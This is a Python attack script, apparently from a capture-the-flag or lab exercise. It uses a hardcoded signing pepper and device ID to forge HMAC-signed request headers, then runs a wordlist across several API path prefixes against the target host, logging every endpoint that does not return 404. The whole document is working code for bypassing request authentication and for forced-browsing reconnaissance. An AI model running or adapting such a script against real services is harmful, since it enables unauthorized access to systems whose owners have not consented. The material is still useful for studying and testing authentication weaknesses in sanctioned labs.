import sys, time, hmac, hashlib, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://web-198ec1caaeb6fd82.web.h7tex.com"
PEPPER = "fleetlink_signing_pepper_v3"
DEV = "flt-33333333-3333-4444-5555-666666666666"


def go(path, q="", raw_sig_check=True):
    ts = str(int(time.time()))
    k = hashlib.sha256((PEPPER + ":" + DEV).encode()).digest()
    sig = hmac.new(k, "\n".join(["GET", path, q, ts]).encode(), hashlib.sha256).hexdigest()
    h = {"X-Device-Id": DEV, "X-Ts": ts}
    if raw_sig_check:
        h["X-Sig"] = sig
    r = urllib.request.Request(BASE + path + (("?" + q) if q else ""), method="GET", headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return "ERR", str(e)[:60]


WORDS = open("words.txt").read().split()
PREFIX = ["/api/v1/", "/api/", "/"]
print(f"{len(WORDS)} words x {len(PREFIX)} prefixes")
for pre in PREFIX:
    for w in WORDS:
        p = pre + w
        s, b = go(p)
        if s != 404:
            who = "FLASK" if b.startswith("<!doctype") or b.startswith("{") else "PROXY"
            print(f"  {pre:10s} {w:16s} {s} {who} {b[:110].strip()}")
    print(f"  done {pre}", flush=True)
